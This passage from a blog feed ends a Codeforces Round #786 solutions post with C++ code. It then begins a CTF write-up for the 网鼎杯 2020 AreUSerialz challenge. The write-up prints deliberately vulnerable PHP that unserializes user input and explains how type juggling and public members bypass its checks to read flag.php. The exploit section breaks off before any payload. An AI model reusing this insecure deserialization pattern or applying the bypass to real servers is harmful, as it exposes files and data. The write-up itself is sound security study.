多个了，主要是数据锅了。</p><p>只需要考虑三种情况，相邻的墙，隔一个的墙和最小两个墙，给你的测试数据很充足，但是实际测试点不行，也不知道这个新写的能不能过。</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">1e9</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;<span class="comment">//￠ù </span></span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> first=a[i],second=a[i+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span>(first&gt;second)<span class="built_in">swap</span>(first,second);</span><br><span class="line">        </span><br><span class="line">        res+=second-first;</span><br><span class="line">        second-=<span class="number">2</span>*res;</span><br><span class="line">        first-=res;</span><br><span class="line">        <span class="keyword">if</span>(first&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            res=<span class="built_in">max</span>(a[i]+<span class="number">1</span>,a[i+<span class="number">1</span>]+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;%d\n&quot;,res);</span></span><br><span class="line">            ans=<span class="built_in">min</span>(ans,res);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> times=first/<span class="number">3</span>;</span><br><span class="line">        res+=times*<span class="number">2</span>;</span><br><span class="line">        first-=times*<span class="number">3</span>;</span><br><span class="line">        second-=times*<span class="number">3</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,first,second);</span></span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,times);</span></span><br><span class="line">        <span class="keyword">while</span>(first&gt;<span class="number">0</span>||second&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(first&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                res+=second/<span class="number">2</span>+second%<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(second&lt;=<span class="number">0</span>)&#123;</span><br><span class="line">                res+=first/<span class="number">2</span>+first%<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(first&gt;second)&#123;</span><br><span class="line">                    first-=<span class="number">2</span>;</span><br><span class="line">                    second-=<span class="number">1</span>;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    second-=<span class="number">2</span>;</span><br><span class="line">                    first-=<span class="number">1</span>;</span><br><span class="line">                    res++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; </span><br><span class="line">        ans=<span class="built_in">min</span>(ans,res);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,ans); </span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n<span class="number">-1</span>;i++)&#123;<span class="comment">//￠ú </span></span><br><span class="line">        <span class="keyword">int</span> first=<span class="built_in">min</span>(a[i],a[i+<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">int</span> second=<span class="built_in">max</span>(a[i],a[i+<span class="number">2</span>]);</span><br><span class="line">        </span><br><span class="line">        ans=<span class="built_in">min</span>(ans,first+(second-first)/<span class="number">2</span>+(second-first)%<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);</span></span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    ans=<span class="built_in">min</span>(ans,(a[<span class="number">1</span>]/<span class="number">2</span>+a[<span class="number">1</span>]%<span class="number">2</span>+a[<span class="number">2</span>]/<span class="number">2</span>+a[<span class="number">2</span>]%<span class="number">2</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//    #ifndef ONLINE_JUDGE</span></span><br><span class="line"><span class="comment">//        freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line"><span class="comment">//    #endif</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="F-Desktop-Rearrangement"><a href="#F-Desktop-Rearrangement" class="headerlink" title="F. Desktop Rearrangement"></a>F. Desktop Rearrangement</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/6.png" alt="6"></p><h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是给你一个桌面，每次询问的时候添加或减少图标，询问需要几次排列好图标。这个直接暴力模拟就可以了，首先计算出有多少个图标，然后把它拍成一列，图标下标在这个值数量之外的数目就是答案了。每次增加或减少最多对答案产生 $1$ 的影响，所以也不难。就是这个x,y，比赛的时候总是搞反，最后发现这个x是行号，y是列号。</p><h3 id="标程-5"><a href="#标程-5" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 2000005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,q;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m&gt;&gt;q;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[j]==<span class="string">&#x27;*&#x27;</span>)&#123;</span><br><span class="line">                a[j*n+i+<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n*m;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&lt;=cnt&amp;&amp;a[i]==<span class="number">0</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    for(int i=1;i&lt;=n*m;i++)&#123;</span></span><br><span class="line"><span class="comment">//        putchar(&#x27;0&#x27;+a[i]);</span></span><br><span class="line"><span class="comment">//    &#125;putchar(10);</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;,ans);;</span></span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">int</span> y,x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;y,&amp;x);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> pos=(x<span class="number">-1</span>)*n+y;</span><br><span class="line">        <span class="keyword">if</span>(a[pos]==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;pos %d appear\n&quot;,pos);</span></span><br><span class="line">            </span><br><span class="line">            cnt++;</span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[cnt]==<span class="number">1</span>)&#123;</span><br><span class="line">                flag--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(pos&gt;cnt)&#123;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            a[pos]=<span class="number">1</span>;</span><br><span class="line">            ans+=flag;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//printf(&quot;pos %d disappear\n&quot;,pos);</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(a[cnt]==<span class="number">1</span>)&#123;</span><br><span class="line">                flag++;</span><br><span class="line">            &#125;</span><br><span class="line">            cnt--;</span><br><span class="line">            <span class="keyword">if</span>(pos&gt;cnt)&#123;</span><br><span class="line">                flag--;</span><br><span class="line">            &#125;</span><br><span class="line">            a[pos]=<span class="number">0</span>;</span><br><span class="line">            ans+=flag;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        for(int i=1;i&lt;=n*m;i++)&#123;</span></span><br><span class="line"><span class="comment">//            putchar(&#x27;0&#x27;+a[i]);</span></span><br><span class="line"><span class="comment">//        &#125;putchar(10);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>赛中做出五道，赛后被叉一道还行吧，反正ABCD写的挺快的，签到手速已经在稳步提升。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1674&quot;&gt;Codeforces Round #786 (Div. 3)&lt;/a&gt;题解来了&lt;/p&gt;
&lt;p&gt;实时录频在&lt;a href=&quot;https://www.bilibili.com/video/BV18B4y117sn?spm_id_from=333.999.0.0&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="题解" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>网鼎杯 2020 青龙组AreUSerialz writeup</title>
    <link href="http://example.com/2022/04/28/wdb2020AreUSerialz/"/>
    <id>http://example.com/2022/04/28/wdb2020AreUSerialz/</id>
    <published>2022-04-27T16:04:00.000Z</published>
    <updated>2022-04-28T12:40:52.841Z</updated>
    
    <content type="html"><![CDATA[<p>做到一道题，写下 <code>write up</code></p><span id="more"></span><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>本题给了源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是 <code>php</code> 反序列化，那么我们主要看看析构函数 <code>__destruct</code>，如果成员 <code>$this-&gt;op===&quot;2&quot;</code> 那么让它变成1，<code>$this-&gt;content</code> 变为空字符串，执行 <code>process</code> 函数。那我们看看 <code>$this-&gt;process</code> 函数的具体细节，如果 <code>$this-&gt;op==&quot;2&quot;</code> 那么执行 <code>read</code> 函数，否则执行 <code>write</code> 函数。首先题目开始给我们看到了是有一个 <code>flag.php</code> 文件的，那么我们肯定是要利用这个对象进行读 <code>flag.php</code> 操作的，但是析构函数的时候会如果发现操作为读，则改为写操作。那么这里需要绕过一下，因为析构函数这里是强比较，而 <code>process</code> 函数判断读写操作是弱比较，这里我们反序列化的时候就可以给一个 <code>int</code> 绕过去，让它不会被改变并且可以被判断为是读操作。</p><p>然后我们再来看看外面，可以发现用了一个函数 <code>is_valid</code> 用于过滤非法字符，而我们反序列化如果对象本身带有 <code>private</code> 或者 <code>protected</code> 类型的对象时，一定要用 <code>0</code> 字节来反序列化，不然会失败，但是低版本的 <code>php</code> 对类型不敏感，所以我们直接把成员类型改成 <code>public</code> 然后按照这个方法构造得到的序列化结果就是 <code>payload</code>。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span 